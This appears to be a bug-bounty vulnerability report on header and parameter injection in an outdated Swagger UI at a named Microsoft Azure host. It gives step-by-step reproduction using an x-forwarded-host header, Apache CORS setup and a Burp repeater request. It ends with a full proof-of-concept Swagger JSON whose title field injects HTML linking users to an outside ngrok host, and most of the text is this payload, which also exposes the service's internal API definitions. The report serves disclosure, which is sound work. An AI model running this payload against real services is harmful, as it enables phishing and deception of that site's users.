![image](https://user-images.githubusercontent.com/66825349/164176795-f24501d1-4f5f-4c94-8a2e-ad6705e11bf3.png)

**swagger parameter & header injection leading to trick users at swagger ui old version on azureavamgmt-api.microsoft.com**

# Description:
- The version being used for swagger ui is an old version and already there is an cve for it **cve-2016-5641**, the impact however is lower than the cve register fot it but we will use the same method for exploiting, the parameter that take url input will parse the json / yaml code and execute it so we can use that to our advantage, and using the **x-forwarded-host: Host[.]com**  in the header we can load our host that have the json file on the page, we can add html code in the json file so we redirect or trick the user's to harm them.
    
 # Steps:
> **Note:** Please before the testing make sure you have the set the provided headers in your .htaccess file, otherwise you will an this error **Can't read from server. It may not have the appropriate access-control-origin settings.**.

* `Access-Control-Allow-Origin "*"`
* `Access-Control-Allow-Methods "GET, POST, OPTIONS"`
* `Access-Control-Allow-Headers "Access-Control-Expose-Headers, Content-Type, Content-Compression, X-Requested-With"`

> **Note:** Please create a directory named **/swagger/docs** in your web server directory and put the poc script in a file WITHOUT any extensions and name the file **v1** , this is becuse the server try to read the json from **/swagger/docs/v1**.

1 - Please brows [here](https://azureavamgmt-api.microsoft.com) or copy this link here ``https://azureavamgmt-api.microsoft.com``.

2 - Start your web server i do use apache.

3 - Please creat a directory named **swagger** in var/www/html or in your web server directory and in inside swagger directory creat another direcory named **docs**.

4 - copy the POC script from the end of this report and use your favorite text editor (i use nano) and make a new file WITH no extensions name the file **v1** and paste the POC script in **v1** file and save it.

![teminal](https://user-images.githubusercontent.com/66825349/164176641-eb8ab905-5200-496b-a10b-44dd83678d44.png)

5 - Please do intercept this request ``GET: https://azureavamgmt-api.microsoft.com/swagger/ui/index`` and send it to repeater.

6 - Copy this ```x-forwarded-host: <YOUR ADDRESS HERE>``` add it to the header in reapeter tab and replace it with your server address, you will see the **rootUrl** will change to whatever you put in there.
![rooturl](https://user-images.githubusercontent.com/66825349/164176678-6aaf9a9d-9cef-4c07-960a-9d1f8ec6a72c.png)

7 - Now in repeater tab right clikc and select **Request in browser** after that click on **in original session**, copy the link make sure your proxy is on and pasete it in browser and if you've done the steps right you will see somthing like the screenshot blow in web page.
![boo](https://user-images.githubusercontent.com/66825349/164176710-9aef29cc-9f1c-402e-97b5-c0c24da47709.png)


# Reference:
>https://hackerone.com/reports/786976
    https://rishuranjanofficial.medium.com/html-injection-in-itunesconnect-apple-com-3f8a898f21ee
    
 # impact:
 - The attacker can execute html code and harm users, there is a possibility to gain XSS how ever i could not do that
    
# Fix Suggestion:
- update the swagger ui .



## POC script 
- ``{"swagger":"2.0","info":{"version":"v1","title":"<p>Please click <a href='http://1912-37-19-205-198.ngrok.io/index.html'>here</a> to continue</p> <!--","description":""},"host":"azureavamgmt-api.microsoft.com","schemes":["https"],"paths":{"/api/v1/featuretoggle/{featureToggleId}":{"get":{"tags":["FeatureToggle"],"summary":"Gets feature toggle details","operationId":"FeatureToggle_GetFeatureToggleDetails","consumes":[],"produces":["application/json","text/json","application/xml","text/xml"],"parameters":[{"name":"featureToggleId","in":"path","description":"The id of the feature toggle to get details for","required":true,"type":"string","enum":["canaryFeatures","logAllMessages","satSurvey"]},{"name":"filters.featureToggleId","in":"query","required":false,"type":"string","enum":["canaryFeatures","logAllMessages","satSurvey"]},{"name":"filters.scope","in":"query","required":false,"type":"string","enum":["system","team","user"]},{"name":"filters.teamId","in":"query","required":false,"type":"string"},{"name":"filters.userId","in":"query","required":false,"type":"integer","format":"int32"}],"responses":{"200":{"description":"OK","schema":{"type":"object"}}}},"patch":{"tags":["FeatureToggle"],"summary":"Updates a feature toggle","operationId":"FeatureToggle_UpdateFeatureToggle","consumes":["application/json","text/json","application/xml","text/xml","application/x-www-form-urlencoded"],"produces":["application/json","text/json","application/xml","text/xml"],"parameters":[{"name":"featureToggleId","in":"path","description":"The id of the feature toggle to update","required":true,"type":"string","enum":["canaryFeatures","logAllMessages","satSurvey"]},{"name":"request","in":"body","description":"The update request for the feature toggle","required":true,"schema":{"$ref":"#/definitions/FeatureToggleUpdateRequest"}}],"responses":{"200":{"description":"OK","schema":{"type":"object"}}}}},"/api/v1/icm/contacts":{"get":{"tags":["Icm"],"operationId":"Icm_GetContactsAsync","consumes":[],"produces":["application/json","text/json","application/xml","text/xml"],"parameters":[{"name":"aliases","in":"query","required":true,"type":"array","items":{"type":"string"},"collectionFormat":"multi"}],"responses":{"200":{"description":"OK","schema":{"type":"object"}}}}},"/api/v1/icm/teams":{"get":{"tags":["Icm"],"operationId":"Icm_GetTeamsAsync","consumes":[],"produces":["application/json","text/json","application/xml","text/xml"],"parameters":[{"name":"teamIds","in":"query","required":true,"type":"array","items":{"type":"integer","format":"int32"},"collectionFormat":"multi"}],"responses":{"200":{"description":"OK","schema":{"type":"object"}}}}},"/api/v1/icm/schedule/{contactId}":{"get":{"tags":["Icm"],"operationId":"Icm_GetContactOnCallSlotsAsync","consumes":[],"produces":["application/json","text/json","application/xml","text/xml"],"parameters":[{"name":"contactId","in":"path","required":true,"type":"integer","format":"int32"},{"name":"request.maxSlotsPerTeam","in":"query","required":false,"type":"integer","format":"int32"},{"name":"request.scheduleType","in":"query","required":false,"type":"array","items":{"type":"string"},"collectionFormat":"multi"},{"name":"request.top","in":"query","required":false,"type":"integer","format":"int32"},{"name":"request.skip","in":"query","required":false,"type":"integer","format":"int32"},{"name":"request.teamIds","in":"query","required":false,"type":"array","items":{"type":"integer","format":"int32"},"collectionFormat":"multi"},{"name":"request.startTime","in":"query","required":false,"type":"string","format":"date-time"},{"name":"request.endTime","in":"query","required":false,"type":"string","format":"date-time"}],"responses":{"200":{"description":"OK","schema":{"type":"object"}}}}},"/api/v1/me/settings":{"get":{"tags":["Me"],"summary":"Get user settings.","operationId":"Me_GetUserSettingsAsync","consumes":[],"produces":["application/json","text/json","application/xml","text/xml"],"responses":{"200":{"description":"OK","schema":{"type":"object"}}}},"patch":{"tags":["Me"],"summary":"Updates specified user 
settings.","operationId":"Me_UpdateUserSettingsAsync","consumes":["application/json","text/json","application/xml","text/xml","application/x-www-form-urlencoded"],"produces":["application/json","text/json","application/xml","text/xml"],"parameters":[{"name":"settingsUpdates","in":"body","required":true,"schema":{"$ref":"#/definitions/UserSettingsRequest"}}],"responses":{"200":{"description":"OK","schema":{"type":"object"}}}}},"/api/v1/me/mycases":{"get":{"tags":["Me"],"summary":"Get all cases that are owned by calling user. \r\n(User has either created the case or an expert checking the case)","operationId":"Me_GetMyCases","consumes":[],"produces":["application/json","text/json","application/xml","text/xml"],"responses":{"200":{"description":"OK","schema":{"type":"object"}}}}},"/api/v1/teams":{"get":{"tags":["Team"],"summary":"Bottom level of the Team Management API. This endpoint returns all teams a given user belongs to.","operationId":"Team_GetTeams","consumes":[],"produces":["application/json","text/json","application/xml","text/xml"],"responses":{"200":{"description":"OK","schema":{"type":"object"}}}}},"/api/v1/teams/pendingcases":{"get":{"tags":["Team"],"summary":"Get all pending cases that the calling user is scheduled.","operationId":"Team_GetPendingCases","consumes":[],"produces":["application/json","text/json","application/xml","text/xml"],"responses":{"200":{"description":"OK","schema":{"type":"object"}}}}},"/api/v1/teams/{teamId}/cases":{"get":{"tags":["Team"],"summary":"Get all cases for the specified team.","operationId":"Team_GetTeamCases","consumes":[],"produces":["application/json","text/json","application/xml","text/xml"],"parameters":[{"name":"teamId","in":"path","required":true,"type":"string"}],"responses":{"200":{"description":"OK","schema":{"type":"object"}}}}},"/api/v1/teams/{teamId}":{"get":{"tags":["Team"],"summary":"Searches for a specified team. Amount of details returned are based off which details are specified.","operationId":"Team_SearchForTeam","consumes":[],"produces":["application/json","text/json","application/xml","text/xml"],"parameters":[{"name":"teamId","in":"path","description":"The URL encoded Teams team id","required":true,"type":"string"},{"name":"include","in":"query","description":"Determines which details will be returned. i.e, if expand=schedules,channels is passed then \r\n            all schedules and channels will return. The following with parameters are accepted: channels, users, roles, schedules, notifyChannels,\r\n            canary, and settings. Any combination of these is possible.","required":false,"type":"string"}],"responses":{"200":{"description":"OK","schema":{"type":"object"}}}}},"/api/v1/teams/{teamId}/roles":{"get":{"tags":["TeamRoles"],"summary":"Gets user roles for a given team.","operationId":"TeamRoles_GetTeamRoleDetails","consumes":[],"produces":["application/json","text/json","application/xml","text/xml"],"parameters":[{"name":"teamId","in":"path","required":true,"type":"string"}],"responses":{"200":{"description":"OK","schema":{"type":"object"}}}},"put":{"tags":["TeamRoles"],"summary":"Updates or inserts team roles specified.","operationId":"TeamRoles_EditTeamRoles","consumes":["application/json","text/json","application/xml","text/xml","application/x-www-form-urlencoded"],"produces":["application/json","text/json","application/xml","text/xml"],"parameters":[{"name":"teamId","in":"path","description":"The team ID which the role belongs to","required":true,"type":"string"},{"name":"roleDetailsCollection","in":"body","description":"All the roles to either insert or update.","required":true,"schema":{"$ref":"#/definitions/RoleDetailsCollection"}}],"responses":{"200":{"description":"OK","schema":{"type":"object"}}}},"post":{"tags":["TeamRoles"],"summary":"Inserts team roles specified.","operationId":"TeamRoles_AddTeamRolesAsync","consumes":["application/json","text/json","application/xml","text/xml","application/x-www-form-urlencoded"],"produces":["application/json","text/json","application/xml","text/xml"],"parameters":[{"name":"teamId","in":"path","
description":"The team ID which the role belongs to","required":true,"type":"string"},{"name":"roleDetailsCollection","in":"body","description":"All the roles to either insert or update.","required":true,"schema":{"$ref":"#/definitions/RoleDetailsCollection"}}],"responses":{"200":{"description":"OK","schema":{"type":"object"}}}},"delete":{"tags":["TeamRoles"],"summary":"Deletes team roles specified.","operationId":"TeamRoles_RemoveTeamRoles","consumes":["application/json","text/json","application/xml","text/xml","application/x-www-form-urlencoded"],"produces":["application/json","text/json","application/xml","text/xml"],"parameters":[{"name":"teamId","in":"path","description":"The team ID deleted role belongs to","required":true,"type":"string"},{"name":"roleDetailsCollection","in":"body","description":"All the roles to be deleted.","required":true,"schema":{"$ref":"#/definitions/RoleDetailsCollection"}}],"responses":{"200":{"description":"OK","schema":{"type":"object"}}}}},"/api/v1/teams/{teamId}/schedules":{"get":{"tags":["TeamSchedule"],"summary":"Gets team schedules for a specified team.","operationId":"TeamSchedule_GetTeamSchedulesDetails","consumes":[],"produces":["application/json","text/json","application/xml","text/xml"],"parameters":[{"name":"teamId","in":"path","required":true,"type":"string"}],"responses":{"200":{"description":"OK","schema":{"type":"object"}}}},"put":{"tags":["TeamSchedule"],"summary":"Updates or inserts a collection of team schedule details.","operationId":"TeamSchedule_UpsertSchedule","consumes":["application/json","text/json","application/xml","text/xml","application/x-www-form-urlencoded"],"produces":["application/json","text/json","application/xml","text/xml"],"parameters":[{"name":"teamId","in":"path","description":"Team ID of team schedule belongs to","required":true,"type":"string"},{"name":"scheduleDetails","in":"body","description":"Collection of schedule details to insert or update","required":true,"schema":{"$ref":"#/definitions/UserScheduleDetails"}}],"responses":{"200":{"description":"OK","schema":{"type":"object"}}}},"delete":{"tags":["TeamSchedule"],"summary":"Deletes a collection of team schedule details.","operationId":"TeamSchedule_DeleteSchedule","consumes":["application/json","text/json","application/xml","text/xml","application/x-www-form-urlencoded"],"produces":["application/json","text/json","application/xml","text/xml"],"parameters":[{"name":"teamId","in":"path","description":"Team ID of team schedule belongs to","required":true,"type":"string"},{"name":"scheduleDetails","in":"body","description":"Collection of schedules to delete","required":true,"schema":{"$ref":"#/definitions/UserScheduleDetails"}}],"responses":{"200":{"description":"OK","schema":{"type":"object"}}}}},"/api/v1/teams/{teamId}/settings":{"get":{"tags":["TeamSettings"],"summary":"Get team settings for specified team.","operationId":"TeamSettings_GetTeamSettingsDetails","consumes":[],"produces":["application/json","text/json","application/xml","text/xml"],"parameters":[{"name":"teamId","in":"path","required":true,"type":"string"}],"responses":{"200":{"description":"OK","schema":{"type":"object"}}}},"post":{"tags":["TeamSettings"],"summary":"Updates team settings with the given details.","operationId":"TeamSettings_UpdateTeamSettings","consumes":["application/json","text/json","application/xml","text/xml","application/x-www-form-urlencoded"],"produces":["application/json","text/json","application/xml","text/xml"],"parameters":[{"name":"teamId","in":"path","description":"ID of team settings are for","required":true,"type":"string"},{"name":"teamSettingsDetails","in":"body","description":"Setting details to update","required":true,"schema":{"$ref":"#/definitions/TeamSettingsDetails"}}],"responses":{"200":{"description":"OK","schema":{"type":"object"}}}}},"/api/v1/teams/{teamId}/users":{"get":{"tags":["TeamUser"],"summary":"Returns information on all users in specified team. Also contains links to related user operations.","operationId":"TeamUser_GetUsersDetails","consumes":[],"produces":["application/
json","text/json","application/xml","text/xml"],"parameters":[{"name":"teamId","in":"path","required":true,"type":"string"}],"responses":{"200":{"description":"OK","schema":{"type":"object"}}}},"put":{"tags":["TeamUser"],"summary":"Updates a specific user.","operationId":"TeamUser_UpdateUser","consumes":["application/json","text/json","application/xml","text/xml","application/x-www-form-urlencoded"],"produces":["application/json","text/json","application/xml","text/xml"],"parameters":[{"name":"teamId","in":"path","description":"ID of team user belongs to","required":true,"type":"string"},{"name":"userDetails","in":"body","description":"Details to update for user","required":true,"schema":{"$ref":"#/definitions/UserDetailsCollection"}}],"responses":{"200":{"description":"OK","schema":{"type":"object"}}}}},"/api/v1/timezones":{"get":{"tags":["Timezone"],"summary":"Bottom level of the Team Management API. This endpoint returns all teams a given user belongs to.","operationId":"Timezone_GetTimezones","consumes":[],"produces":["application/json","text/json","application/xml","text/xml"],"responses":{"200":{"description":"OK","schema":{"type":"object"}}}}},"/api/v1/timezones/{ianaName}":{"get":{"tags":["Timezone"],"summary":"Bottom level of the Team Management API. This endpoint returns all teams a given user belongs to.","operationId":"Timezone_GetTimezones","consumes":[],"produces":["application/json","text/json","application/xml","text/xml"],"parameters":[{"name":"ianaName","in":"path","required":true,"type":"string"}],"responses":{"200":{"description":"OK","schema":{"type":"object"}}}}}},"definitions":{"FeatureToggleRequest":{"type":"object","properties":{"featureToggleId":{"enum":["canaryFeatures","logAllMessages","satSurvey"],"type":"string"},"scope":{"enum":["system","team","user"],"type":"string"},"teamId":{"type":"string"},"userId":{"format":"int32","type":"integer"}}},"FeatureToggleUpdateRequest":{"type":"object","properties":{"isEnabled":{"type":"boolean"},"isHidden":{"type":"boolean"},"isEditable":{"type":"boolean"},"autoEnroll":{"type":"boolean"},"isEnrolled":{"type":"boolean"},"featureToggleId":{"enum":["canaryFeatures","logAllMessages","satSurvey"],"type":"string"},"scope":{"enum":["system","team","user"],"type":"string"},"teamId":{"type":"string"},"userId":{"format":"int32","type":"integer"}}},"IcmContactOnCallScheduleRequest":{"type":"object","properties":{"maxSlotsPerTeam":{"format":"int32","type":"integer"},"onCallPositionRange":{"type":"array","items":{"format":"int32","type":"integer"},"readOnly":true},"scheduleType":{"type":"array","items":{"type":"string"}},"top":{"format":"int32","type":"integer"},"skip":{"format":"int32","type":"integer"},"teamIds":{"type":"array","items":{"format":"int32","type":"integer"}},"startTime":{"format":"date-time","type":"string"},"endTime":{"format":"date-time","type":"string"}}},"UserSettingsRequest":{"type":"object","properties":{"teamId":{"type":"string"},"isOof":{"type":"boolean"},"isBulkNotifyEnabled":{"type":"boolean"},"userAadObjectId":{"type":"string"}}},"RoleDetailsCollection":{"type":"object","properties":{"roleDetails":{"type":"array","items":{"$ref":"#/definitions/RoleDetails"}}}},"RoleDetails":{"type":"object","properties":{"id":{"format":"int32","type":"integer"},"name":{"type":"string"},"description":{"type":"string"},"notifyType":{"format":"int32","type":"integer"},"isDefaultRole":{"type":"boolean"},"viewPermissions":{"type":"array","items":{"$ref":"#/definitions/TeamPermissionsDetails"}},"isDeleted":{"type":"boolean"}}},"TeamPermissionsDetails":{"type":"object","properties":{"permission":{"format":"int32","type":"integer"},"userRoleId":{"format":"int32","type":"integer"},"isEnabled":{"type":"boolean"},"roleName":{"type":"string"},"description":{"type":"string"}}},"UserScheduleDetails":{"type":"object","properties":{"schedules":{"type":"array","items":{"$ref":"#/definitions/ScheduleDetailsCollection"}}}},"ScheduleDetailsCollection":{"type":"object","properties":{"user":{"$ref":"#/definitions/UserDetails"},"scheduleDetails":{"type":"array","items":{"$ref":"#/
definitions/ScheduleDetails"}}}},"UserDetails":{"type":"object","properties":{"teamsUserId":{"type":"string"},"userId":{"format":"int32","type":"integer"},"role":{"$ref":"#/definitions/RoleDetails"},"name":{"type":"string"},"alias":{"type":"string"},"isOutOfOffice":{"type":"boolean"},"isAdmin":{"type":"boolean"},"userGroupId":{"format":"int32","type":"integer"},"userGroupName":{"type":"string"},"aadObjectId":{"type":"string"}}},"ScheduleDetails":{"type":"object","properties":{"scheduleType":{"enum":["weekly","alwaysOn","icM"],"type":"string"},"description":{"type":"string"},"scheduleId":{"format":"int32","type":"integer"},"channel":{"$ref":"#/definitions/ChannelDetails"},"offering":{"$ref":"#/definitions/CaseOfferingDetails"},"start":{"type":"string"},"end":{"type":"string"},"timeZone":{"type":"string"},"key":{"type":"string","readOnly":true},"daysOfWeek":{"type":"string"},"role":{"$ref":"#/definitions/RoleDetails"}}},"ChannelDetails":{"type":"object","properties":{"teamsChannelId":{"type":"string"},"name":{"type":"string"},"teamId":{"type":"string"},"teamName":{"type":"string"},"isRecommended":{"type":"boolean"},"order":{"format":"int32","type":"integer"}}},"CaseOfferingDetails":{"type":"object","properties":{"id":{"type":"string"},"name":{"type":"string"}}},"TeamSettingsDetails":{"type":"object","properties":{"permissions":{"type":"array","items":{"$ref":"#/definitions/TeamPermissionsDetails"}},"autoArchive":{"type":"boolean"},"autoArchiveHours":{"format":"int32","type":"integer"},"notificationDelay":{"type":"boolean"},"notificationDelayMinutes":{"format":"int32","type":"integer"},"scheduleNotificationDetails":{"type":"array","items":{"$ref":"#/definitions/ChannelNotificationDetails"}},"teamSettingsCaseNotificationTimes":{"$ref":"#/definitions/TeamSettingsCaseNotificationTimes"}}},"ChannelNotificationDetails":{"type":"object","properties":{"teamsChannelId":{"type":"string"},"name":{"type":"string"},"areNotificationsEnabled":{"type":"boolean"}}},"TeamSettingsCaseNotificationTimes":{"type":"object","properties":{"premier":{"$ref":"#/definitions/SeveritySettings","readOnly":true},"bc":{"$ref":"#/definitions/SeveritySettings","readOnly":true},"arr":{"$ref":"#/definitions/SeveritySettings","readOnly":true},"chat":{"$ref":"#/definitions/SeveritySettings","readOnly":true},"community":{"$ref":"#/definitions/PrioritySettings","readOnly":true},"noID":{"$ref":"#/definitions/PrioritySettings","readOnly":true}}},"SeveritySettings":{"type":"object","properties":{"sev1":{"format":"int32","type":"integer"},"sevA":{"format":"int32","type":"integer"},"sevB":{"format":"int32","type":"integer"},"sevC":{"format":"int32","type":"integer"}}},"PrioritySettings":{"type":"object","properties":{"high":{"format":"int32","type":"integer"},"normal":{"format":"int32","type":"integer"}}},"UserDetailsCollection":{"type":"object","properties":{"userDetails":{"type":"array","items":{"$ref":"#/definitions/UserDetails"}}}}}}``
